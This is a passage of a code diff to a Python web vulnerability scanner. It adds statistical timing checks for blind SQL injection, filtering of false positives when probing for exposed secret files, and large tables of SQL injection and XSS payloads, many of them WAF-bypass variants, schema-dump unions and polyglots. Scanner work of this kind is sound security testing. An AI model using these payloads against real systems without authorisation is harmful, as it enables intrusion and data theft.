@@ -19,6 +19,113 @@ try:
 except ImportError:
     oidc_discover = None
 
+# Browser proof for XSS verification (optional - graceful degradation if unavailable)
+try:
+    from .proof_of_exploit import prove_xss_headless, ExploitProof
+    HAS_XSS_PROOF = True
+except ImportError:
+    HAS_XSS_PROOF = False
+    prove_xss_headless = None
+    ExploitProof = None
+
+# Statistical testing for SQLi timing validation (optional)
+try:
+    from scipy.stats import mannwhitneyu
+    import statistics
+    HAS_SCIPY = True
+except ImportError:
+    HAS_SCIPY = False
+    mannwhitneyu = None
+
+
+def statistical_timing_test(
+    baseline_times: list[float],
+    payload_times: list[float],
+    expected_delay: float = 2.0,
+    significance_level: float = 0.05
+) -> dict[str, Any]:
+    """
+    Statistical timing validation using Mann-Whitney U test.
+
+    Uses non-parametric testing to determine if payload response times
+    are significantly higher than baseline, accounting for network jitter.
+
+    Args:
+        baseline_times: List of baseline response times (seconds)
+        payload_times: List of payload response times (seconds)
+        expected_delay: Expected injection delay (default 2.0s for SLEEP(2))
+        significance_level: P-value threshold (default 0.05)
+
+    Returns:
+        Dict with: confirmed (bool), p_value, confidence, baseline_median,
+                   payload_median, delay_observed
+    """
+    if not HAS_SCIPY:
+        # Fallback to simple median comparison if scipy not available
+        import statistics as stats
+        baseline_median = stats.median(baseline_times) if baseline_times else 0
+        payload_median = stats.median(payload_times) if payload_times else 0
+        delay_observed = payload_median - baseline_median
+        # Simple threshold check
+        confirmed = delay_observed >= expected_delay * 0.8
+        return {
+            "confirmed": confirmed,
+            "p_value": None,
+            "confidence": 0.75 if confirmed else 0.3,
+            "baseline_median": baseline_median,
+            "payload_median": payload_median,
+            "delay_observed": delay_observed,
+            "method": "median_comparison",
+        }
+
+    # Mann-Whitney U test (non-parametric, doesn't assume normal distribution)
+    # H0: payload times are from the same distribution as baseline
+    # H1: payload times are greater (one-sided test)
+    try:
+        stat, p_value = mannwhitneyu(
+            baseline_times,
+            payload_times,
+            alternative='less'  # We expect baseline < payload
+        )
+    except ValueError:
+        # Not enough data for test
+        return {
+            "confirmed": False,
+            "p_value": None,
+            "confidence": 0.3,
+            "error": "Insufficient data for statistical test",
+            "method": "mann_whitney_failed",
+        }
+
+    baseline_median = statistics.median(baseline_times)
+    payload_median = statistics.median(payload_times)
+    delay_observed = payload_median - baseline_median
+
+    # Confirmed if:
+    # 1. Statistically significant (p < significance_level)
+    # 2. Observed delay is at least 80% of expected
+    confirmed = p_value < significance_level and delay_observed >= expected_delay * 0.8
+
+    # Confidence based on p-value
+    if p_value < 0.01 and delay_observed >= expected_delay:
+        confidence = 0.95
+    elif p_value < 0.05 and delay_observed >= expected_delay * 0.8:
+        confidence = 0.85
+    elif p_value < 0.10:
+        confidence = 0.70
+    else:
+        confidence = 0.40
+
+    return {
+        "confirmed": confirmed,
+        "p_value": round(p_value, 6),
+        "confidence": confidence,
+        "baseline_median": round(baseline_median, 3),
+        "payload_median": round(payload_median, 3),
+        "delay_observed": round(delay_observed, 3),
+        "method": "mann_whitney_u",
+    }
+
 
 async def dalfox_one(url: str, quick_mode: bool = False, auth_session: Any | None = None) -> dict[str, Any]:
     """Run Dalfox XSS scanner on a single URL. Returns dict with findings and execution status."""
@@ -955,19 +1062,41 @@ async def check_exposed_files(base_url: str, quick_mode: bool = False) -> dict[s
     ]
     sensitive_paths = high_priority_paths[:30] if quick_mode else high_priority_paths + medium_priority_paths + low_priority_paths[:20]
     async def test_canary():
+        """Test random non-existent paths to fingerprint error responses and detect catch-all servers."""
         rand_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
         canary_paths = [f"/definitely-not-real-{rand_suffix}.txt", f"/.git/fake-file-{rand_suffix}", f"/test-{rand_suffix}/.env", f"/random-{rand_suffix}/config.php"]
         canary_responses: list[dict[str, Any]] = []
         for canary in canary_paths:
             full_url = urllib.parse.urljoin(base_url, canary)
-            content_out, _, content_rc = await run(["curl", "-sS", "-L", "-k", "--max-time", "3", "--max-filesize", "50000", "-H", "User-Agent: Mozilla/5.0", full_url])
-            headers_with_body, _, _ = await run(["curl", "-sS", "-i", "-L", "-k", "--max-time", "3", "--max-filesize", "50000", "-H", "User-Agent: Mozilla/5.0", full_url])
+            content_out, _, content_rc = await run(["curl", "-sS", "-L", "-k", "--max-time", "3", "--max-filesize", "100000", "-H", "User-Agent: Mozilla/5.0", full_url])
+            headers_with_body, _, _ = await run(["curl", "-sS", "-i", "-L", "-k", "--max-time", "3", "--max-filesize", "100000", "-H", "User-Agent: Mozilla/5.0", full_url])
             if content_rc == 0 and content_out and headers_with_body:
                 first_line = headers_with_body.splitlines()[0] if headers_with_body else ""
-                if "200" in first_line:
-                    content_hash = hashlib.sha256(content_out.encode('utf-8', errors='ignore')).hexdigest()[:16]
-                    canary_responses.append({"path": canary, "content_hash": content_hash, "content_length": len(content_out), "content_sample": content_out[:500]})
-        return canary_responses
+                # Extract status code from response
+                status_code = "unknown"
+                if first_line:
+                    parts = first_line.split()
+                    if len(parts) >= 2:
+                        status_code = parts[1]
+                content_hash = hashlib.sha256(content_out.encode('utf-8', errors='ignore')).hexdigest()[:16]
+                # Record ALL responses regardless of status code
+                canary_responses.append({
+                    "path": canary,
+                    "status": status_code,
+                    "content_hash": content_hash,
+                    "content_length": len(content_out),
+                    "content_sample": content_out[:500]
+                })
+        # Detect catch-all servers: if all canary paths return identical content, server returns same response for everything
+        catch_all = False
+        catch_all_fingerprint = None
+        if len(canary_responses) >= 2:
+            unique_hashes = set(c["content_hash"] for c in canary_responses)
+            if len(unique_hashes) == 1:
+                # All random paths return identical content = catch-all server
+                catch_all = True
+                catch_all_fingerprint = canary_responses[0]
+        return {"catch_all": catch_all, "fingerprint": catch_all_fingerprint, "responses": canary_responses}
     def extract_header(headers: str, header_name: str):
         if not headers:
             return None
@@ -1017,7 +1146,46 @@ async def check_exposed_files(base_url: str, quick_mode: bool = False) -> dict[s
             markers.append("credential_like")
         return markers
 
-    async def check_path_smart(path: str, canary_fps: list[dict[str, Any]]):
+    # Plain-text soft-404 error patterns (common generic error messages)
+    SOFT_404_PATTERNS = [
+        "not found", "page not found", "404", "no available server",
+        "file not found", "does not exist", "cannot be found",
+        "resource not found", "invalid path", "unknown route",
+        "service unavailable", "server error", "bad request",
+        "access denied", "forbidden", "unauthorized", "not available",
+        "error occurred", "something went wrong", "please try again",
+        "the page you requested", "could not be found", "no longer exists"
+    ]
+
+    def is_pem_private_key(content: str) -> bool:
+        """Check if content looks like a PEM-encoded private key."""
+        # Note: Binary formats (DER/PKCS#12) can't be reliably detected because
+        # run() decodes stdout as UTF-8, dropping non-UTF8 bytes. PEM is text-based
+        # and survives UTF-8 decoding intact.
+        return "BEGIN" in content and "PRIVATE KEY" in content
+
+    def is_pem_certificate(content: str) -> bool:
+        """Check if content looks like a PEM-encoded certificate."""
+        return "BEGIN" in content and "CERTIFICATE" in content
+
+    # Critical files that MUST have valid PEM content markers to be reported.
+    # Binary formats (DER/PKCS#12) are not validated since run() decodes as UTF-8.
+    CRITICAL_FILE_VALIDATORS = {
+        "id_rsa": is_pem_private_key,
+        "id_dsa": is_pem_private_key,
+        "id_ecdsa": is_pem_private_key,
+        "id_ed25519": is_pem_private_key,
+        ".pem": lambda c: is_pem_private_key(c) or is_pem_certificate(c),
+        "server.key": is_pem_private_key,
+        "private.key": is_pem_private_key,
+        "privatekey": is_pem_private_key,
+        "ssl.key": is_pem_private_key,
+        "cert.key": is_pem_private_key,
+        "privkey.pem": is_pem_private_key,
+        "key.pem": is_pem_private_key,
+    }
+
+    async def check_path_smart(path: str, canary_fps: list[dict[str, Any]], canary_result: dict[str, Any]):
         full_url = urllib.parse.urljoin(base_url, path)
         headers_out, _, headers_rc = await run(["curl", "-sS", "-I", "-L", "-k", "--max-time", "5", "-H", "User-Agent: Mozilla/5.0", full_url])
         head_success = False
@@ -1036,15 +1204,24 @@ async def check_exposed_files(base_url: str, quick_mode: bool = False) -> dict[s
                     return None
                 headers_out = headers_with_body.split("\r\n\r\n", 1)[0] if "\r\n\r\n" in headers_with_body else headers_with_body.split("\n\n", 1)[0]
         response_fp = create_fingerprint(content_out, headers_out)
+
+        # Check if server is a catch-all (returns identical content for all paths)
+        if canary_result.get("catch_all") and canary_result.get("fingerprint"):
+            catch_all_hash = canary_result["fingerprint"]["content_hash"]
+            if response_fp["hash"] == catch_all_hash:
+                return None  # Same content as random non-existent paths = false positive
+
         # Filter out HTML responses for non-HTML paths to cut false positives
         if response_fp["has_html"]:
             pl = path.lower()
             if not (pl.endswith(('.html', '.htm', '.php', '.asp', '.aspx')) or pl.startswith('.git')):
                 return None
+
+        # Compare against canary fingerprints (only if we have them)
         for canary_fp in canary_fps:
             if canary_fp["hash"] == response_fp["hash"]:
                 return None
-            if abs(canary_fp["length"] - response_fp["length"]) < canary_fp["length"] * 0.1:
+            if canary_fp["length"] > 0 and abs(canary_fp["length"] - response_fp["length"]) < canary_fp["length"] * 0.1:
                 if canary_fp.get("content_sample", "")[:200] == content_out[:200]:
                     return None
         expected_types = {".json": ["application/json", "text/json"], ".yml": ["text/yaml", "application/x-yaml", "text/plain"], ".yaml": ["text/yaml", "application/x-yaml", "text/plain"], ".xml": ["application/xml", "text/xml"], ".txt": ["text/plain"], ".env": ["text/plain", "application/octet-stream"]}
@@ -1069,6 +1246,29 @@ async def check_exposed_files(base_url: str, quick_mode: bool = False) -> dict[s
             except (json.JSONDecodeError, ValueError):
                 pass
 
+        # Filter out plain-text soft-404 error responses (short generic error messages)
+        # Be careful not to filter legitimate config files that happen to contain error words
+        if len(content_lower) < 150:
+            # Check if this looks like a config/secret file (has key=value or key: value patterns)
+            # Matches: KEY=, key=, db.host=, api-key=, 2fa_secret=, etc.
+            has_config_pattern = bool(re.search(r'(?m)^[A-Za-z0-9_][A-Za-z0-9_.\-]*\s*[=:]', content_out))
+            if not has_config_pattern:
+                # Only filter if error pattern is dominant (>40% of content)
+                for pattern in SOFT_404_PATTERNS:
+                    if pattern in content_lower:
+                        # Error phrase must be substantial part of the response
+                        if len(pattern) > len(content_lower) * 0.4 or len(content_lower) < 50:
+                            return None
+                        break
+
+        # Critical files MUST have valid content markers - no marker = false positive
+        path_lower = path.lower()
+        for pattern, validator in CRITICAL_FILE_VALIDATORS.items():
+            if pattern in path_lower:
+                if not validator(content_out):
+                    return None  # Reject without valid markers
+                break  # Passed validation
+
         return {
             "path": path,
             "status": "200",
@@ -1082,11 +1282,12 @@ async def check_exposed_files(base_url: str, quick_mode: bool = False) -> dict[s
             "has_html": response_fp["has_html"],
             "markers": derive_markers(path, content_out),
         }
-    canary_fps = [{"hash": c["content_hash"], "length": c["content_length"], "content_sample": c["content_sample"]} for c in await test_canary()]
+    canary_result = await test_canary()
+    canary_fps = [{"hash": c["content_hash"], "length": c["content_length"], "content_sample": c["content_sample"]} for c in canary_result.get("responses", [])]
     batch_size = 10
     for i in range(0, len(sensitive_paths), batch_size):
         batch = sensitive_paths[i : i + batch_size]
-        results = await asyncio.gather(*[check_path_smart(p, canary_fps) for p in batch])
+        results = await asyncio.gather(*[check_path_smart(p, canary_fps, canary_result) for p in batch])
         exposed.extend([r for r in results if r])
 
     # Bundle .git exposures into a single grouped finding with subentries
@@ -2067,17 +2268,26 @@ DBMS_FINGERPRINTS = {
     ],
 }
 
-# DBMS-specific SQLi payloads
+# DBMS-specific SQLi payloads with WAF bypass techniques
+# Each payload is (payload, technique_name, description)
+# Techniques: boolean, time_based, union, error_based, waf_bypass, etc.
 DBMS_SQLI_PAYLOADS = {
     "sqlite": [
+        # Basic payloads
         ("')) --", "comment_bypass", "Try double-paren close with comment"),
         ("')) OR 1=1--", "boolean_always_true", "Boolean injection"),
         ("')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "union_9col", "Union probe"),
         ("')) UNION SELECT sql,name,type,tbl_name,5,6,7,8,9 FROM sqlite_master--", "schema_dump", "SQLite schema extraction"),
         ("')) UNION SELECT 1,sqlite_version(),3,4,5,6,7,8,9--", "version", "SQLite version extraction"),
         ("' OR ''='", "string_true", "String comparison bypass"),
+        # WAF bypass variants
+        ("'/**/OR/**/1=1--", "waf_bypass_comment", "Comment-based WAF bypass"),
+        ("' OR 1=1#", "hash_comment", "Hash comment alternative"),
+        ("'%20OR%201=1--", "url_encode", "URL-encoded spaces"),
+        ("' /*!OR*/ 1=1--", "mysql_comment_hint", "MySQL conditional comment"),
     ],
     "mysql": [
+        # Basic payloads
         ("' OR 1=1-- -", "boolean", "Boolean injection"),
         ("' UNION SELECT NULL,@@version,NULL-- -", "version", "MySQL version"),
         ("' UNION SELECT NULL,user(),NULL-- -", "user", "Current user"),
@@ -2085,72 +2295,206 @@ DBMS_SQLI_PAYLOADS = {
         ("' AND SLEEP(2)-- -", "time_based", "Time-based blind"),
         ("' AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -", "time_nested", "Nested time-based"),
         ("1' ORDER BY 10-- -", "column_count", "Column enumeration"),
+        # WAF bypass variants - inline comments
+        ("'/**/OR/**/1=1-- -", "waf_inline_comment", "Inline comment bypass"),
+        ("' /*!50000OR*/ 1=1-- -", "waf_version_comment", "MySQL version conditional"),
+        ("' OR/*!*/1=1-- -", "waf_empty_comment", "Empty conditional comment"),
+        # WAF bypass variants - encoding
+        ("'%09OR%091=1-- -", "waf_tab_encode", "Tab character bypass"),
+        ("'%0aOR%0a1=1-- -", "waf_newline", "Newline bypass"),
+        ("' oR 1=1-- -", "waf_case_variation", "Case variation bypass"),
+        # WAF bypass - alternate syntax
+        ("' || 1=1-- -", "waf_or_operator", "OR operator alternative"),
+        ("' && 1=1-- -", "waf_and_operator", "AND operator"),
+        ("'-1' OR '1'='1", "waf_quoted_numbers", "Quoted number comparison"),
+        # WAF bypass - function obfuscation
+        ("' AND BENCHMARK(5000000,MD5('test'))-- -", "time_benchmark", "Benchmark time-based"),
+        ("' AND (SELECT * FROM (SELECT SLEEP(2))a)-- -", "time_subquery", "Subquery time-based"),
+        # Error-based
+        ("' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -", "error_extractvalue", "ExtractValue error"),
+        ("' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)-- -", "error_updatexml", "UpdateXML error"),
     ],
     "postgresql": [
+        # Basic payloads
         ("' OR 1=1--", "boolean", "Boolean injection"),
         ("'; SELECT pg_sleep(2)--", "time_based", "Time-based blind"),
         ("' UNION SELECT NULL,version(),NULL--", "version", "PostgreSQL version"),
         ("' UNION SELECT NULL,current_user,NULL--", "user", "Current user"),
         ("' UNION SELECT NULL,current_database(),NULL--", "database", "Current database"),
+        # WAF bypass variants
+        ("'/**/OR/**/1=1--", "waf_comment", "Comment-based bypass"),
+        ("' OR 1=1;--", "semicolon_comment", "Semicolon with comment"),
+        ("'||'1'='1", "concat_operator", "String concat operator"),
+        ("' OR 1::int=1--", "type_cast", "Type casting bypass"),
+        # Error-based
+        ("' AND 1=CAST((SELECT version()) AS INT)--", "error_cast", "Cast error-based"),
+        # Stacked queries (PostgreSQL supports them)
+        ("'; SELECT pg_sleep(2);--", "stacked_time", "Stacked query time"),
     ],
     "mssql": [
+        # Basic payloads
         ("' OR 1=1--", "boolean", "Boolean injection"),
         ("'; WAITFOR DELAY '0:0:2'--", "time_based", "Time-based blind"),
         ("' UNION SELECT NULL,@@version,NULL--", "version", "MSSQL version"),
         ("' UNION SELECT NULL,SYSTEM_USER,NULL--", "user", "System user"),
         ("' UNION SELECT NULL,DB_NAME(),NULL--", "database", "Current database"),
+        # WAF bypass variants
+        ("'/**/OR/**/1=1--", "waf_comment", "Comment-based bypass"),
+        ("' oR 1=1--", "waf_case", "Case variation"),
+        ("' OR%091=1--", "waf_tab", "Tab character"),
+        # Stacked queries (MSSQL supports them)
+        ("'; SELECT 1; WAITFOR DELAY '0:0:2'--", "stacked_time", "Stacked with delay"),
+        # Error-based
+        ("' AND 1=CONVERT(int,@@version)--", "error_convert", "Convert error-based"),
     ],
     "oracle": [
+        # Basic payloads
         ("' OR 1=1--", "boolean", "Boolean injection"),
         ("' UNION SELECT NULL,banner,NULL FROM v$version WHERE ROWNUM=1--", "version", "Oracle version"),
         ("' UNION SELECT NULL,user,NULL FROM dual--", "user", "Current user"),
+        # Oracle-specific time-based
+        ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',2)--", "time_pipe", "Pipe-based time delay"),
+        ("' AND UTL_INADDR.GET_HOST_ADDRESS('sleep.test')='1'--", "time_dns", "DNS-based delay"),
+        # WAF bypass
+        ("'/**/OR/**/1=1--", "waf_comment", "Comment-based bypass"),
+        ("' OR 1=1--", "waf_null", "Null byte variant"),
+        # Error-based
+        ("' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--", "error_ctx", "CTX error"),
     ],
     "generic": [
+        # Basic payloads (work across most DBMS)
         ("'", "quote", "Single quote test"),
+        ("\"", "double_quote", "Double quote test"),
         ("' OR '1'='1", "boolean", "Boolean OR"),
         ("' OR '1'='1'--", "boolean_comment", "Boolean with comment"),
+        ("' OR '1'='1'#", "boolean_hash", "Boolean with hash"),
+        ("' OR '1'='1'/*", "boolean_block_comment", "Boolean with block comment"),
         ("1 OR 1=1", "numeric_boolean", "Numeric boolean"),
         ("' UNION SELECT NULL--", "union_probe", "Union probe"),
         ("1; SELECT 1--", "stacked", "Stacked query test"),
+        # WAF bypass - general techniques
+        ("'/**/OR/**/1=1--", "waf_inline_comment", "Inline comment spaces"),
+        ("'%09OR%091=1--", "waf_tab_encode", "Tab instead of space"),
+        ("'%0aOR%0a1=1--", "waf_newline_encode", "Newline instead of space"),
+        ("'%0dOR%0d1=1--", "waf_carriage_return", "Carriage return"),
+        ("' oR 1=1--", "waf_mixed_case", "Mixed case keywords"),
+        ("' Or 1=1--", "waf_title_case", "Title case keywords"),
+        ("' OR 0x31=0x31--", "waf_hex_encode", "Hex-encoded values"),
+        ("' OR CHAR(49)=CHAR(49)--", "waf_char_encode", "CHAR function encoding"),
+        ("'+OR+1=1--", "waf_plus_space", "Plus sign as space"),
+        # Double encoding
+        ("'%252f%252a%252a%252fOR%252f%252a%252a%252f1=1--", "waf_double_encode", "Double URL encoding"),
+        # Unicode bypass attempts
+        ("' OR 1%ef%bc%9d1--", "waf_unicode_equal", "Unicode equals sign"),
+        # Null byte injection
+        ("'%00OR 1=1--", "waf_null_byte", "Null byte injection"),
+        # HTTP Parameter Pollution context
+        ("' OR '1'='1", "hpp_context", "HPP-friendly payload"),
     ],
 }
 
-# Context-specific XSS payloads
+# Context-specific XSS payloads with WAF bypass variants
+# Each payload is (payload, technique_name, description)
 CONTEXT_XSS_PAYLOADS = {
     "in_script": [
+        # Basic payloads
         ("';alert(1)//", "script_break", "Break out of string context"),
         ("</script><script>alert(1)</script>", "script_escape", "Escape script tag"),
         ("-alert(1)-", "template_literal", "Template literal context"),
         ("\\';alert(1)//", "escaped_quote", "Escaped quote bypass"),
+        # WAF bypass variants
+        ("';alert`1`//", "script_template_literal", "Template literal call"),
+        ("';window['ale'+'rt'](1)//", "script_concat", "String concatenation"),
+        ("';eval('ale'+'rt(1)')//", "script_eval_concat", "Eval with concat"),
+        ("';setTimeout('alert(1)',0)//", "script_settimeout", "setTimeout bypass"),
+        ("';Function('alert(1)')()//", "script_function", "Function constructor"),
+        ("';[].constructor.constructor('alert(1)')()//", "script_array_proto", "Array prototype chain"),
     ],
     "in_angular": [
         ("{{constructor.constructor('alert(1)')()}}", "ng_sandbox_bypass", "Angular sandbox bypass"),
         ("{{$on.constructor('alert(1)')()}}", "ng_on_bypass", "Angular $on bypass"),
         ("{{7*7}}", "ng_expr_test", "Angular expression test"),
+        # Additional Angular/Vue payloads
+        ("{{_c.constructor('alert(1)')()}}", "ng_underscore", "Angular _c bypass"),
+        ("{{toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)}}", "ng_orderby", "Angular orderBy bypass"),
     ],
     "in_event_handler": [
         ("'-alert(1)-'", "handler_break", "Break handler string"),
         ("javascript:alert(1)", "js_proto", "JavaScript protocol"),
         ("'onclick=alert(1)//", "inject_handler", "Inject new handler"),
+        # WAF bypass
+        ("'-eval('ale'+'rt(1)')-'", "handler_eval", "Eval in handler"),
+        ("'-window['al'+'ert'](1)-'", "handler_window", "Window property access"),
     ],
     "in_attribute": [
+        # Basic payloads
         ("' onmouseover=alert(1) x='", "attr_event", "Inject event handler"),
         ('" onfocus=alert(1) autofocus="', "attr_focus", "Auto-focus event"),
         ("'><script>alert(1)</script><'", "attr_escape", "Escape attribute"),
         ("' style='background:url(javascript:alert(1))'", "style_inject", "Style injection"),
+        # WAF bypass - HTML entity encoding
+        ("' onmouseover=&#97;&#108;&#101;&#114;&#116;(1) x='", "attr_html_entity", "HTML entity encoded"),
+        # WAF bypass - case variations
+        ("' OnMouseOver=alert(1) x='", "attr_mixed_case", "Mixed case event"),
+        ("' ONMOUSEOVER=alert(1) x='", "attr_upper_case", "Upper case event"),
+        # Less common event handlers
+        ("' onanimationend=alert(1) x='", "attr_animation", "Animation event"),
+        ("' ontransitionend=alert(1) x='", "attr_transition", "Transition event"),
+        ("' onpointerenter=alert(1) x='", "attr_pointer", "Pointer event"),
     ],
     "in_html": [
+        # Basic payloads
         ("<script>alert(1)</script>", "script_tag", "Script tag injection"),
         ("<img src=x onerror=alert(1)>", "img_error", "Image error handler"),
         ("<svg onload=alert(1)>", "svg_load", "SVG onload"),
         ("<body onload=alert(1)>", "body_load", "Body onload"),
         ("<iframe src='javascript:alert(1)'>", "iframe_js", "Iframe JavaScript"),
         ("<details open ontoggle=alert(1)>", "details_toggle", "Details toggle"),
+        # WAF bypass - tag variations
+        ("<ScRiPt>alert(1)</ScRiPt>", "script_mixed_case", "Mixed case script tag"),
+        ("<SCRIPT>alert(1)</SCRIPT>", "script_upper", "Uppercase script tag"),
+        ("<svg/onload=alert(1)>", "svg_slash", "SVG with slash"),
+        ("<img/src=x/onerror=alert(1)>", "img_slashes", "Image with slashes"),
+        ("<img src=x onerror=alert`1`>", "img_backticks", "Image with template literal"),
+        # Less common tags with event handlers
+        ("<video src=x onerror=alert(1)>", "video_error", "Video error handler"),
+        ("<audio src=x onerror=alert(1)>", "audio_error", "Audio error handler"),
+        ("<input onfocus=alert(1) autofocus>", "input_autofocus", "Input autofocus"),
+        ("<marquee onstart=alert(1)>", "marquee_start", "Marquee onstart"),
+        ("<object data='javascript:alert(1)'>", "object_data", "Object data URL"),
+        ("<embed src='javascript:alert(1)'>", "embed_src", "Embed src"),
+        # Polyglot payloads
+        ("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", "polyglot", "XSS polyglot"),
     ],
     "in_js_url": [
         ("alert(1)", "direct_call", "Direct function call"),
         ("alert`1`", "template_call", "Template literal call"),
         ("confirm(1)", "confirm_call", "Confirm function"),
+        # Additional variants
+        ("window['alert'](1)", "window_bracket", "Window bracket notation"),
+        ("window.alert(1)", "window_dot", "Window dot notation"),
+        ("eval('alert(1)')", "eval_call", "Eval call"),
+        ("Function('alert(1)')()", "function_constructor", "Function constructor"),
+    ],
+    "in_url_path": [
+        ("<script>alert(1)</script>", "path_script", "Script in URL path"),
+        ("javascript:alert(1)", "path_js_proto", "JavaScript protocol in path"),
+        ("%3Cscript%3Ealert(1)%3C/script%3E", "path_url_encoded", "URL-encoded script tag"),
+    ],
+    "in_css": [
+        ("expression(alert(1))", "css_expression", "CSS expression (IE)"),
+        ("url('javascript:alert(1)')", "css_url_js", "CSS url with JavaScript"),
+        ("</style><script>alert(1)</script>", "css_escape", "Escape style tag"),
+    ],
+    "in_svg": [
+        ("<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>", "svg_xmlns", "SVG with xmlns"),
+        ("<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "svg_animate", "SVG animate"),
+        ("<svg><set onbegin=alert(1) attributename=x to=x>", "svg_set", "SVG set"),
+    ],
+    "in_json": [
+        # JSON context XSS (when JSON is parsed/eval'd)
+        ("</script><script>alert(1)</script>", "json_escape", "Escape JSON context"),
+        ('{"x":"</script><script>alert(1)</script>"}', "json_inject", "JSON value injection"),
     ],
 }
 
@@ -2222,7 +2566,8 @@ def detect_reflection_context(response_body: str, marker: str) -> str:
 
     Returns:
         Context type: "in_script", "in_angular", "in_event_handler",
-                     "in_attribute", "in_html", "in_js_url", "not_reflected"
+                     "in_attribute", "in_html", "in_js_url", "in_css", "in_svg",
+                     "in_url_path", "in_json", "not_reflected"
     """
     if marker not in response_body:
         return "not_reflected"
@@ -2232,18 +2577,51 @@ def detect_reflection_context(response_body: str, marker: str) -> str:
     after = response_body[idx:idx + len(marker) + 100]
 
     # Check context patterns (order matters - more specific first)
+
+    # Script context (inside <script> tags)
     if re.search(r'<script[^>]*>[^<]*$', before, re.I | re.S):
         return "in_script"
+
+    # Angular/Vue template expressions
     if re.search(r'{{[^}]*$', before):
         return "in_angular"
+
+    # Event handler attributes (onclick, onmouseover, etc.)
     if re.search(r"on\w+\s*=\s*['\"]?[^'\"]*$", before, re.I):
         return "in_event_handler"
+
+    # SVG context (inside <svg> elements - check if inside unclosed svg tag)
+    # Look for <svg that's not followed by </svg> before the marker
+    if re.search(r'<svg[^>]*>', before, re.I) and not re.search(r'</svg>', before, re.I):
+        return "in_svg"
+    if re.search(r'<svg[^>]*$', before, re.I):
+        return "in_svg"
+
+    # JSON context (inside JSON object/array)
+    # Check for patterns like {"key": " or ["value",
+    if re.search(r'["\']:\s*["\']?$', before) or re.search(r'\[\s*["\']?$', before):
+        # Verify it looks like JSON structure
+        if re.search(r'^\s*[\[{]', response_body[:100]) or 'application/json' in response_body[:500].lower():
+            return "in_json"
+
+    # CSS/Style context (inside <style> tags or style attributes)
+    if re.search(r'<style[^>]*>[^<]*$', before, re.I | re.S):
+        return "in_css"
+    if re.search(r'style\s*=\s*["\'][^"\']*$', before, re.I):
+        return "in_css"
+
+    # URL path context (in href/src attributes pointing to paths)
+    if re.search(r'(href|src|action)\s*=\s*["\']?/[^"\']*$', before, re.I):
+        return "in_url_path"
+
+    # JavaScript URL context (href="javascript:..." or similar)
+    # Check if we're inside a javascript: URL scheme
+    if re.search(r'(href|src|action)\s*=\s*["\']?javascript:[^"\']*$', before, re.I):
+        return "in_js_url"
+
+    # Generic attribute context
     if re.search(r"<\w+[^>]+\w+\s*=\s*['\"]?$", before, re.I):
         return "in_attribute"
-    if re.search(r"<style[^>]*>[^<]*$", before, re.I | re.S):
-        return "in_style"
-    if re.search(r"javascript:\s*$", before, re.I):
-        return "in_js_url"
     if re.search(r"href\s*=\s*['\"]?$", before, re.I):
         return "in_attribute"
 
@@ -2262,7 +2640,7 @@ def _coerce_body_values(body: dict[str, Any]) -> dict[str, str]:
     return {key: _stringify_body_value(value) for key, value in body.items()}
 
 
-def _encode_body_string(body: dict[str, Any], content_type: str) -> str:
+def _encode_body_string(body: Any, content_type: str) -> str:
     if "application/json" in content_type:
         return json.dumps(body)
     if "application/x-www-form-urlencoded" in content_type:
@@ -2272,11 +2650,29 @@ def _encode_body_string(body: dict[str, Any], content_type: str) -> str:
     return json.dumps(body)
 
 
-def _build_curl_body_args(body: dict[str, Any], content_type: str) -> tuple[list[str], list[str]]:
+def _headers_from_curl_args(args: list[str]) -> dict[str, str]:
+    """Extract headers from curl arg list."""
+    headers: dict[str, str] = {}
+    i = 0
+    while i < len(args) - 1:
+        if args[i] == "-H":
+            name, _, value = args[i + 1].partition(":")
+            name = name.strip()
+            value = value.strip()
+            if name:
+                headers[name] = value
+            i += 2
+            continue
+        i += 1
+    return headers
+
+
+def _build_curl_body_args(body: Any, content_type: str) -> tuple[list[str], list[str]]:
     if "multipart/form-data" in content_type:
         form_args = []
-        for key, value in body.items():
-            form_args.extend(["-F", f"{key}={_stringify_body_value(value)}"])
+        if isinstance(body, dict):
+            for key, value in body.items():
+                form_args.extend(["-F", f"{key}={_stringify_body_value(value)}"])
         return form_args, []
     data = _encode_body_string(body, content_type)
     return ["-d", data], ["-H", f"Content-Type: {content_type}"]
@@ -2411,7 +2807,7 @@ def _set_nested_value(container: dict[str, Any], key: str, value: Any, overwrite
         cursor[parts[-1]] = value
 
 
-def _build_body_template(endpoint: dict[str, Any], param: str | None = None) -> dict[str, Any]:
+def _build_body_template(endpoint: dict[str, Any], param: str | None = None) -> Any:
     defaults = endpoint.get("body_param_defaults") or {}
     required = endpoint.get("body_required_params") or []
     body_params = endpoint.get("body_params") or []
@@ -2420,32 +2816,46 @@ def _build_body_template(endpoint: dict[str, Any], param: str | None = None) -> 
 
     template = endpoint.get("body_template")
     if isinstance(template, dict):
-        body: dict[str, Any] = copy.deepcopy(template)
+        body: Any = copy.deepcopy(template)
+    elif isinstance(template, list):
+        body = copy.deepcopy(template)
     else:
         body = {}
 
+    target: dict[str, Any] | None = None
+    if isinstance(body, list):
+        if not body:
+            body.append({})
+        if isinstance(body[0], dict):
+            target = body[0]
+    elif isinstance(body, dict):
+        target = body
+
     # Apply default values
-    for name, value in defaults.items():
-        if nested:
-            if not _has_nested_key(body, name):
-                _set_nested_value(body, name, value, overwrite=False)
-        else:
-            body.setdefault(name, value)
+    if target is not None:
+        for name, value in defaults.items():
+            if nested:
+                if not _has_nested_key(target, name):
+                    _set_nested_value(target, name, value, overwrite=False)
+            else:
+                target.setdefault(name, value)
 
     base_params = required if required else body_params
-    for name in base_params:
-        if nested:
-            if not _has_nested_key(body, name):
-                _set_nested_value(body, name, _fallback_value_for_param(name), overwrite=False)
-        else:
